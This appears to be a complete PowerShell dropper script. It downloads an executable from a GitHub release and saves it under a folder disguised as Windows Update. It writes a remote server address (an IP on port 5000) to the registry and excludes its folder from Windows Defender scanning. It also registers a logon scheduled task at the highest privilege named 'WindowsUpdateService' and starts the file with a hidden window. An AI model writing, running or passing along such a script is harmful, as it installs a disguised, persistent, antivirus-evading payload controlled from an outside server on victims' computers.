$url = "https://github.com/timbundon/cab-314/releases/latest/download/client.exe"
$dir = "$env:ProgramData\WindowsUpdate"
$file = "$dir\Update.exe"
$taskName = "WindowsUpdateService"
$regPath = "HKCU:\Software\cab-314"
$serverUrl = "http://26.116.201.168:5000"

taskkill /f /im Update.exe 2>$null

if (!(Test-Path $dir)) { New-Item -Path $dir -ItemType Directory -Force }
if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force }
New-ItemProperty -Path $regPath -Name "ServerURL" -Value $serverUrl -PropertyType String -Force

Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $url -OutFile $file -UseBasicParsing

$action = New-ScheduledTaskAction -Execute $file -WorkingDirectory $dir
$trigger = New-ScheduledTaskTrigger -AtLogon
$principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force

if (Test-Path $file) {
    Start-Process -FilePath $file -WorkingDirectory $dir -WindowStyle Hidden
}